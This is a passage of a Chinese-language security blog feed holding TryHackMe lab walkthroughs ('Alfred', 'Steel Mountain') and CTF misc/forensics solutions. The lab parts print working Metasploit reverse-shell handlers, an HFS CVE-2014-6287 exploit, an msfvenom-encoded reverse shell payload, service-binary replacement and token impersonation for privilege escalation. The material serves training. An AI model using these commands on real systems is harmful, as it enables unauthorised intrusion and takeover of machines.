alt="image-20241209165214594"></p><p>打开一个新的终端 开启msfconsole 进行配置</p><pre><code>msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LHOST 10.14.92.176LHOST =&gt; 10.14.92.176msf6 exploit(multi/handler) &gt; set LPORT 1234  # 这里要和我们前面制作shell-name.exe时选择的端口一致LPORT =&gt; 1234msf6 exploit(multi/handler) &gt; run</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091706821.png" alt="image-20241209170640615"></p><p>到这里 成功切换成了meterpreter shell</p><p>What is the final size of the exe payload that you generated?</p><pre><code>73802</code></pre><p>这个在前面制作的时候就能看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091707205.png" alt="image-20241209170736162"></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>现在我们有了初始访问权限，让我们使用令牌模拟来获取系统访问权限。</p><p>Windows 使用令牌来确保帐户具有执行特定操作的正确权限。帐户令牌在用户登录或进行身份验证时分配给帐户。这通常由 LSASS.exe 完成（将此视为身份验证过程）。</p><p>此访问令牌包括：</p><ul><li>用户 SID （安全标识符）</li><li>组 SID</li><li>特权</li></ul><p>有两种类型的访问令牌：</p><ul><li>主访问令牌：登录时生成的与用户帐户关联的令牌</li><li>模拟令牌：这些令牌允许特定进程（或进程中的线程）使用另一个（用户&#x2F;客户端）进程的令牌访问资源</li></ul><p>对于模拟令牌，有不同的级别：</p><ul><li>SecurityAnonymous：当前用户&#x2F;客户端无法模拟其他用户&#x2F;客户端</li><li>SecurityIdentification：当前用户&#x2F;客户端可以获取客户端的身份和权限，但不能模拟客户端</li><li>SecurityImpersonation：当前用户&#x2F;客户端可以在本地系统上模拟客户端的安全内容</li><li>SecurityDelegation：当前用户&#x2F;客户端可以在远程系统上模拟客户端的安全内容</li></ul><p>其中，安全内容是包含用户相关安全信息的数据结构。</p><p>帐户的权限（在创建时授予帐户或从组继承）允许用户执行特定操作。以下是最常被滥用的权限：</p><ul><li>SeImpersonatePrivilege</li><li>SeAssignPrimaryPrivilege</li><li>SeTcbPrivilege</li><li>SeBackupPrivilege</li><li>SeRestorePrivilege</li><li>SeCreateTokenPrivilege</li><li>SeLoadDriverPrivilege</li><li>SeTakeOwnershipPrivilege</li><li>SeDebugPrivilege</li></ul><p>了解完前置知识后 先在原来的shell中执行</p><pre><code>whoami /priv</code></pre><p>查看我们可以来利用的权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091724200.png" alt="image-20241209172428047"></p><p>其中我们看到了<code>SeDebugPrivilege、SeImpersonatePrivilege</code>是上面提到的可以被利用的权限</p><p>再回到meterpreter shell中 </p><pre><code> load incognito list_tokens -g</code></pre><p>看到<code>BUILTIN\Administrators</code> 也就是我们可以模拟管理员权限的令牌</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091729789.png" alt="image-20241209172934719"></p><pre><code>“Incognito” 模块专门设计用于在受感染的系统内执行利用后活动和权限提升，使用获得的会话作为起点。它提供了各种功能来操作令牌、模拟用户、避免检测和提升权限等操作。</code></pre><p>下面使用命令来进行模拟</p><pre><code>impersonate_token “BUILTIN\Administratorsgetuid</code></pre><p>看到SYSTEM说明模拟成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091740651.png" alt="image-20241209174051527"></p><p>即使您拥有更高特权的令牌，您也可能没有特权用户的权限（这是由于 Windows 处理权限的方式 - 它使用进程的主令牌而不是模拟令牌来确定进程可以做什么或不能做什么）。</p><p>确保迁移到具有正确权限的进程（上述问题的答案）。最安全的拣选过程是 services.exe 过程。首先，使用 <code>ps</code>命令查看进程并查找services.exe进程的 PID。使用命令 <code>migrate PID-OF-PROCESS</code> 迁移到此进程</p><pre><code>ps</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091744098.png" alt="image-20241209174420955"></p><p>迁移后 cat读取即可</p><pre><code>migrate 668cat &quot;C:\Windows\System32\config\root.txt&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091744184.png" alt="image-20241209174443128"></p><h2 id="考点总结："><a href="#考点总结：" class="headerlink" title="考点总结："></a>考点总结：</h2><p>   1.后台弱口令登陆</p><ol start="2"><li>Jenkins 2.190 CVE-2024–23897任意文件读取、远程代码执行</li><li>使用Nishang反弹shell</li><li>普通shell切换meterpreter shell</li><li>令牌模拟提权</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Alfred&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Alfred&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Alfred&quot;&gt;&lt;/a&gt;Offen</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Steel Mountain</title>
    <link href="http://w3nx1z1.github.io/posts/34fc8f4b.html"/>
    <id>http://w3nx1z1.github.io/posts/34fc8f4b.html</id>
    <published>2024-12-09T02:12:21.988Z</published>
    <updated>2025-02-14T08:30:17.430Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Steel-Mountain"><a href="#Offensive-Pentesting-Steel-Mountain" class="headerlink" title="Offensive Pentesting-Steel Mountain"></a>Offensive Pentesting-Steel Mountain</h1><pre><code>Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.</code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre><code>n this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.If you don&#39;t have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.在这个房间里，您将列举一台 Windows 计算机，使用 Metasploit 获得初始访问权限，使用 Powershell 进一步列举该计算机，并将您的权限升级到管理员。如果您没有合适的安全工具和环境，请部署您自己的 Kali Linux 机器并使用我们的 Kali Room 在浏览器中对其进行控制。请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。</code></pre><p>和上一台hackpark一样 是不响应ICMP的 我们先来扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081241559.png" alt="image-20241208124139444"></p><p>这里可以发现是有两个web服务 一个在80端口 一个在8080端口</p><p>先访问80端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081246831.png" alt="image-20241208124613748"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081246406.png" alt="image-20241208124627982"></p><p>看到有一个月度员工的图片 打开看到图片名为BillHarper 也就是这位月度员工的名字</p><p>谁是本月最佳员工？</p><pre><code>Bill Harper</code></pre><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>Scan the machine with nmap. What is the other port running a web server on?</p><pre><code>8080</code></pre><p>上面已经提到 另一台web服务开放在8080端口上 我们来访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081652681.png" alt="image-20241208165229583"></p><p>可以看到是一个HFS2.3的网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081652872.png" alt="image-20241208165258804"></p><p>因为答案给的格式是<code>******* **** **** ******</code>  所以我们在HTTP File Server前面加上Rejetto</p><p>Take a look at the other web server. What file server is running?</p><pre><code>Rejetto HTTP File Server</code></pre><p>对于这个版本的漏洞 可以搜一下 主要是一个2024年的一个2014年的 这个靶机应该不是今年才出的 那应该是这个14年的洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081658138.png" alt="image-20241208165851084"></p><p>What is the CVE number to exploit this file server?</p><pre><code>2014-6287</code></pre><p>既然我们现在已经知道了漏洞的版本号  我们可以直接使用msfconsole来获取shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082013041.png" alt="image-20241208201335860"></p><pre><code>set RHOST 10.10.167.60set RPOST 8080set payload windows/meterpreter/reverse_tcpset LHOST 10.14.92.176set LPORT 4444set SRVPORT 1234exploitshell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082031235.png" alt="image-20241208203122907"></p><p>Use Metasploit to get an initial shell. What is the user flag?</p><pre><code>b04763b6fcf51fcd7c13abc7db4fd365</code></pre><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>我们这里提权使用名为PowerUp 的 powershell 脚本 </p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>我们先在msfconsole里面使用upload命令上传这个脚本 输入exit或者键入ctrl C都可以 先退出当前的shell</p><pre><code>upload /home/w3nx1z1/桌面/thm/offensivepentesting/Steel\ Mountain/PowerUp.ps1load powershellpowershell_shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082121337.png" alt="image-20241208212107250"></p><pre><code>. .\PowerUp.ps1Invoke-AllChecksInvoke-AllChecks 是一个典型的 PowerShell 脚本或函数的名称，常用于信息安全领域。具体作用取决于它的上下文，但在渗透测试和防御评估中，它通常与权限提升（Privilege Escalation）检查相关。通常情况下，它可能属于以下工具之一：PowerUp 模块的一部分：PowerUp 是 PowerSploit 框架中的一个模块，用于在 Windows 系统上查找权限提升的潜在漏洞。Invoke-AllChecks 是 PowerUp 中的一个函数，用于运行一系列自动化的安全检查来发现系统配置的弱点，比如不安全的服务权限、不安全的注册表键、或可以利用的文件系统权限。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082123615.png" alt="image-20241208212300535"></p><p>请密切注意设置为 true 的 CanRestart 选项。显示为<em>未加引号的服务路径</em>漏洞的服务名称是什么？</p><pre><code>AdvancedSystemCareService9</code></pre><p>如果 CanRestart 选项为 true，则允许我们重新启动系统上的服务，应用程序的目录也是可写的。这意味着我们可以用我们的恶意应用程序替换合法应用程序，重新启动服务，这将运行我们受感染的程序！</p><p>使用 msfvenom 生成反向 shell 作为 Windows 可执行文件。</p><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.92.176 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082124126.png" alt="image-20241208212417068"></p><p>此时我们在回到刚才的PS会话中 键入Ctrl C先退出 上传我们上面生成的反向shell程序</p><pre><code>upload /home/w3nx1z1/桌面/thm/offensivepentesting/Steel\ Mountain/ASCService.exeshellsc qc AdvancedSystemCareService9  # 查看一个服务的详细配置信息。sc stop AdvancedSystemCareService9 # 停止一个服务opy ASCService.exe &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot; # 将我们上传的反弹shell的可执行程序覆盖掉原有的服务的程序 sc start AdvancedSystemCareService9 # 重启这个服务 也就是运行我们上传的反弹shell程序</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082126995.png" alt="image-20241208212643909"></p><p>同时我们需要在另一个终端中开启一个监听端口 使用我们上面制作反弹shell的程序时的端口 重启服务后 发现成功反弹到了管理员权限的shell 进一步读取root权限的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082129705.png" alt="image-20241208212922651"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412082129295.png" alt="image-20241208212934210"></p><p>我们可以运行什么 powershell -c 命令来手动查找服务名称？</p><p><em>格式为 “powershell -c ”command here“</em></p><pre><code>powershell -c &quot;Get-Service&quot;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Steel-Mountain&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Steel-Mountain&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-S</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2024国城杯Misc wp</title>
    <link href="http://w3nx1z1.github.io/posts/d56c555.html"/>
    <id>http://w3nx1z1.github.io/posts/d56c555.html</id>
    <published>2024-12-08T09:23:57.054Z</published>
    <updated>2025-02-14T08:30:17.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024国城杯Misc-wp"><a href="#2024国城杯Misc-wp" class="headerlink" title="2024国城杯Misc wp"></a>2024国城杯Misc wp</h1><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>说了取证有四部分 先取证大师+火眼整一下</p><p>先看到桌面有个流量包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071707744.png" alt="image-20241207170759531"></p><p>提出来 发现藏了一张jpg图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071708752.png" alt="image-20241207170854629"></p><p>提出来 放010看一下 有一串base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071709002.png" alt="image-20241207170952918"></p><p>解一下 提示oursecret</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071710258.png" alt="image-20241207171051142"></p><p>使用oursecret来解密 提出来一个hidden.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071712855.png" alt="image-20241207171248798"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071711411.png" alt="image-20241207171131340"></p><p> 提示QQ空间 正好上面流量是QQ的OICQ协议流量 发现直接给了一个QQ号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071712856.png" alt="image-20241207171218759"></p><p>搜索一下 在QQ空间说说中找到密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071714546.png" alt="image-20241207171402496"></p><p>直接aes-ecb解 拿到flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071714796.png" alt="image-20241207171429733"></p><p>在压缩文件中找到一个flag4</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071715549.png" alt="image-20241207171514433"></p><p>可以直接解压 exe放沙箱里面分析一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071728105.png" alt="image-20241207172843977"></p><p>用pyinstxtractor解包 找到关键的pyc文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071729308.png" alt="image-20241207172913267"></p><p>在线反编译 拿到加密代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071729411.png" alt="image-20241207172935278"></p><p>写出解密代码</p><pre><code class="python">def xor_decrypt(encrypted_data, key):    decrypted_data = bytearray()    for i in range(len(encrypted_data)):        decrypted_data.append(encrypted_data[i] ^ key[i % len(key)])    return decrypted_datadef read_file(file_path):    with open(file_path, &#39;rb&#39;) as file:        data = file.read()    return datadef write_file(file_path, data):    with open(file_path, &#39;wb&#39;) as file:        file.write(data)def decrypt_file(input_file_path, output_file_path, key):    encrypted_data = read_file(input_file_path)    decrypted_data = xor_decrypt(encrypted_data, key)    write_file(output_file_path, decrypted_data)if __name__ == &#39;__main__&#39;:    key = b&#39;GCcup_wAngwaNg!!&#39;    encrypted_file = &#39;flag4_encrypted.bin&#39;    decrypted_file = &#39;flag4_decrypted.png&#39;    decrypt_file(encrypted_file, decrypted_file, key)</code></pre><p>拿到flag4</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071730737.png" alt="image-20241207173021684"></p><p>还能找到一个修改了后缀名的压缩包 名为<code>2</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071730882.png" alt="image-20241207173050813"></p><p>根据要求 得到密码是</p><pre><code>D0g3xGC_Windows_7_Ultimate_115.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071732175.png" alt="image-20241207173253110"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071732548.png" alt="image-20241207173242511"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071732107.png" alt="image-20241207173229971"></p><p>flag2放到赛博厨子里面解一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071733519.png" alt="image-20241207173331441"></p><p>还找到一个Original.zip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081725498.png" alt="image-20241207173359256"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071734307.png" alt="image-20241207173411239"></p><p>得到解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071734463.png" alt="image-20241207173450425"></p><pre><code>qwe123!@#_Y0u_f1Nd^_^m3_233</code></pre><p>还找到一张和Original.zip解压出来看起来很相似的一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071736100.png" alt="image-20241207173622975"></p><p>根据名字 找到一个项目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071736945.png" alt="image-20241207173637845"></p><p>根据这篇文章的代码得知 变换次数恒为1 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071737413.png" alt="image-20241207173711299"></p><p>但是看到上面项目中的加密脚本里面写的了三个参数dx dy rd的范围都比较小 我们这里已知rd恒为1 可以写脚本进行交叉爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071738016.png" alt="image-20241207173840932"></p><pre><code class="python">import osimport sysimport numpy as npfrom PIL import Image, ImageFileImageFile.LOAD_TRUNCATED_IMAGES = Truedef arnold_cat_map(image, key=(1, 2, 1)):    &quot;&quot;&quot;    Implements Arnold&#39;s cat map transformation on an image.    &quot;&quot;&quot;    height, width, *_ = image.shape    offset_x, offset_y, iterations = key    new_image = np.zeros(image.shape, dtype=np.uint8)    for x in range(height):        for y in range(width):            _x, _y = x, y            _y = (_y + offset_x * _x) % width            _x = (_x + offset_y * _y) % height            new_image[_x, _y] = image[x, y]    return new_imagedef arnold_cat_map_rev(image, key=(1, 2, 1)):    &quot;&quot;&quot;    Implements Arnold&#39;s cat map transformation on an image (reverse).    &quot;&quot;&quot;    height, width, *_ = image.shape    offset_x, offset_y, iterations = key    new_image = np.zeros(image.shape, dtype=np.uint8)        for x in range(height):        for y in range(width):            _x, _y = x, y            _x = (_x - offset_y * _y) % height            _y = (_y - offset_x * _x) % width            new_image[_x, _y] = image[x, y]    return new_imagedef extract_watermark(original_image_path, watermarked_image_path, output_image_path, private_key):    &quot;&quot;&quot;    Extracts a text watermark from a watermarked image using the Arnold&#39;s cat map transformation.    &quot;&quot;&quot;    # Open the original image    original_image = np.array(Image.open(original_image_path).convert(&quot;RGB&quot;))    # Open the watermarked image    watermarked_image = np.array(Image.open(watermarked_image_path).convert(&quot;RGB&quot;))    assert watermarked_image.shape == original_image.shape    # Extract the watermark from the watermarked image    original_image ^= watermarked_image    transformed_image = arnold_cat_map(original_image, private_key)    transformed_image[transformed_image &gt; 0] = 255    transformed_image = 255 - transformed_image    # Save the extracted watermark    Image.fromarray(np.uint8(transformed_image)).save(output_image_path)def try_arnold_dx_dy(original_image_path, watermarked_image_path, output_image_path, arnold_rd, dx_range, dy_range):    original_image = np.array(Image.open(original_image_path).convert(&quot;RGB&quot;))    watermarked_image = np.array(Image.open(watermarked_image_path).convert(&quot;RGB&quot;))    height, width, *_ = original_image.shape    # Iterate over the entire range of arnold_dx and arnold_dy    for arnold_dx in dx_range:        for arnold_dy in dy_range:            private_key = (arnold_dx, arnold_dy, arnold_rd)                        # Perform the transformation            extracted_watermark = arnold_cat_map(original_image ^ watermarked_image, private_key)            extracted_watermark[extracted_watermark &gt; 0] = 255            extracted_watermark = 255 - extracted_watermark            # Save the result with the current arnold_dx and arnold_dy in the filename            output_filename = f&quot;&#123;output_image_path&#125;_arnold_dx_&#123;arnold_dx&#125;_arnold_dy_&#123;arnold_dy&#125;.png&quot;            Image.fromarray(np.uint8(extracted_watermark)).save(output_filename)            print(f&quot;Saved &#123;output_filename&#125; with arnold_dx = &#123;arnold_dx&#125;, arnold_dy = &#123;arnold_dy&#125;&quot;)# 输入参数检查if len(sys.argv) != 4:    print(&quot;Usage: brute_force_arnold_dx_dy.py original_image watermarked_image output_image&quot;)    sys.exit(1)original_image_path = sys.argv[1]watermarked_image_path = sys.argv[2]output_image_path = sys.argv[3]# 定义arnold_rd为1arnold_rd = 1# 设置爆破范围dx_range = range(164, 264)  # arnold_dx 范围从 43 到 385dy_range = range(21, 186)  # arnold_dy 范围从 21 到 185# 开始爆破 arnold_dx 和 arnold_dytry_arnold_dx_dy(original_image_path, watermarked_image_path, output_image_path, arnold_rd, dx_range, dy_range)</code></pre><p>最后找到一张看起来比较清楚的一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071739556.png" alt="image-20241207173948495"></p><pre><code>F1N4L_s3CR3t_0F_Th15_</code></pre><p>拼起来就是</p><pre><code>D0g3xGC&#123;Y0u_h4V3_f0und_7H3_F1N4L_s3CR3t_0F_Th15_F0R3N51c5_Ch4Ll3N93&#125;</code></pre><h2 id="Tr4ffIc-w1th-Ste90"><a href="#Tr4ffIc-w1th-Ste90" class="headerlink" title="Tr4ffIc_w1th_Ste90"></a>Tr4ffIc_w1th_Ste90</h2><p>流量中追踪udp流 找到一个视频文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071741345.png" alt="image-20241207174140244"></p><p>这边先是原始数据保存出来 如果不知道文件类型的话 可以使用magika识别一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071742072.png" alt="image-20241207174215982"></p><p>打开视频 发现解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071742726.png" alt="image-20241207174233582"></p><p>得到加密图片和加密脚本 根据加密脚本 我们得知加密脚本使用的种子范围是50-70 我们可以写解密脚本爆破解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071744781.png" alt="image-20241207174400701"></p><pre><code class="python">import numpy as npimport cv2import osdef decode(input_image, output_image, seed):    &quot;&quot;&quot;    Decode the given image using the specified seed.    &quot;&quot;&quot;    np.random.seed(seed)      to_decode = cv2.imread(input_image, cv2.IMREAD_GRAYSCALE)        if to_decode is None:        print(f&quot;Error: Unable to load image &#123;input_image&#125;&quot;)        return False    to_decode_array = np.asarray(to_decode)    row_indices = list(range(to_decode_array.shape[0]))    col_indices = list(range(to_decode_array.shape[1]))    np.random.shuffle(row_indices)    np.random.shuffle(col_indices)    # Generate reverse indices to undo the shuffling    row_reverse_indices = [row_indices.index(i) for i in range(to_decode_array.shape[0])]    col_reverse_indices = [col_indices.index(i) for i in range(to_decode_array.shape[1])]    # Undo the shuffle by using the reverse indices    to_decode_array = to_decode_array[row_reverse_indices, :]    to_decode_array = to_decode_array[:, col_reverse_indices]    # Convert the image back to BGR for visualization    decoded_image = cv2.cvtColor(to_decode_array, cv2.COLOR_GRAY2BGR)    cv2.imwrite(output_image, decoded_image)    print(f&quot;Decoded image saved as &#123;output_image&#125;&quot;)    return Truedef brute_force_decode(input_image, output_dir, seed_start, seed_end):    &quot;&quot;&quot;    Brute force the decryption using a range of seeds.    &quot;&quot;&quot;    if not os.path.exists(output_dir):        os.makedirs(output_dir)    for seed in range(seed_start, seed_end + 1):        output_image = os.path.join(output_dir, f&quot;decoded_&#123;seed&#125;.png&quot;)        success = decode(input_image, output_image, seed)        if not success:            print(f&quot;Failed to decode image with seed &#123;seed&#125;&quot;)if __name__ == &#39;__main__&#39;:    input_image = &quot;encoded.png&quot;    output_dir = &quot;decoded_images&quot;    seed_start = 50    seed_end = 70    brute_force_decode(input_image, output_dir, seed_start, seed_end)</code></pre><p>找到正确的解密图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071744706.png" alt="image-20241207174455612"></p><p>在线扫码识别一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071745012.png" alt="image-20241207174549917"></p><pre><code>I randomly found a word list to encrypt the flag. I only remember that Wikipedia said this word list is similar to the NATO phonetic alphabet.crumpled chairlift freedom chisel island dashboard crucial kickoff crucial chairlift drifter classroom highchair cranky clamshell edict drainage fallout clamshell chatter chairlift goldfish chopper eyetooth endow chairlift edict eyetooth deadbolt fallout egghead chisel eyetooth cranky crucial deadbolt chatter chisel egghead chisel crumpled eyetooth clamshell deadbolt chatter chopper eyetooth classroom chairlift fallout drainage klaxon</code></pre><p>意思是找了一个类似于NATO phonetic alphabet的字典进行了加密 我们也不用找这个NATO phonetic alphabet 直接去搜下面的密文 发现是PGP词汇表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071747150.png" alt="image-20241207174705013"></p><p>直接根据映射关系 得到了解密的16进制数据</p><pre><code>44 30 67 33 78 47 43 7B 43 30 4E 39 72 41 37 55 4C 61 37 31 30 6E 35 5F 59 30 55 5F 48 61 56 33 5F 41 43 48 31 33 56 33 44 5F 37 48 31 35 5F 39 30 61 4C 7D</code></pre><p>解密得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071747337.png" alt="image-20241207174752209"></p><h2 id="eZ-Steg0"><a href="#eZ-Steg0" class="headerlink" title="eZ_Steg0"></a>eZ_Steg0</h2><p>给的01.png使用stegsolve看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071911565.png" alt="image-20241207191107498"></p><p>提出来的数据 re一下 在解hex 得到一个password图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071911622.png" alt="image-20241207191138491"></p><p>使用给的password解压key.zip 打开看到key前部有base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081718674.png" alt="image-20241208171813603"></p><p>解一下得到<code>stl</code>的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081718223.png" alt="image-20241208171847146"></p><p>猜测是stl3D模型文件 删掉base64部分 改成stl后缀 可以直接用自带的3D查看器打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081721099.png" alt="image-20241208172134993"></p><p>得到一个key</p><pre><code>sSeCre7KeY?!!@$</code></pre><p>在使用这个密钥和flag文件进行异或 得到一个wav文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081723029.png" alt="image-20241207191012849"></p><p>我们再来看一下音频 频谱图deepsound之类的都尝试过 没有结果 发现是音频的lsb隐写</p><pre><code class="python">import wavedef extract_lsb_from_wav(file_path):    with wave.open(file_path, mode=&#39;rb&#39;) as song:        frame_bytes = song.readframes(song.getnframes())        binary_string = &quot;&quot;        for byte in frame_bytes:            binary_string += bin(byte)[-1]         decoded_chars = []        for i in range(0, len(binary_string), 8):            byte = binary_string[i:i+8]            if len(byte) == 8:                 decoded_chars.append(chr(int(byte, 2)))        decoded_message = &#39;&#39;.join(decoded_chars).split(&quot;###&quot;)[0]        return decoded_messagefile_path = &quot;download.wav&quot;decoded_message = extract_lsb_from_wav(file_path)print( decoded_message)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412071916350.png" alt="image-20241207191648290"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024国城杯Misc-wp&quot;&gt;&lt;a href=&quot;#2024国城杯Misc-wp&quot; class=&quot;headerlink&quot; title=&quot;2024国城杯Misc wp&quot;&gt;&lt;/a&gt;2024国城杯Misc wp&lt;/h1&gt;&lt;h2 id=&quot;取证&quot;&gt;&lt;a href=&quot;#取证&quot;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>2024第一届数证杯决赛——个人赛</title>
    <link href="http://w3nx1z1.github.io/posts/b983cae0.html"/>
    <id>http://w3nx1z1.github.io/posts/b983cae0.html</id>
    <published>2024-12-03T09:29:03.754Z</published>
    <updated>2025-02-14T08:30:17.441Z</updated>
    
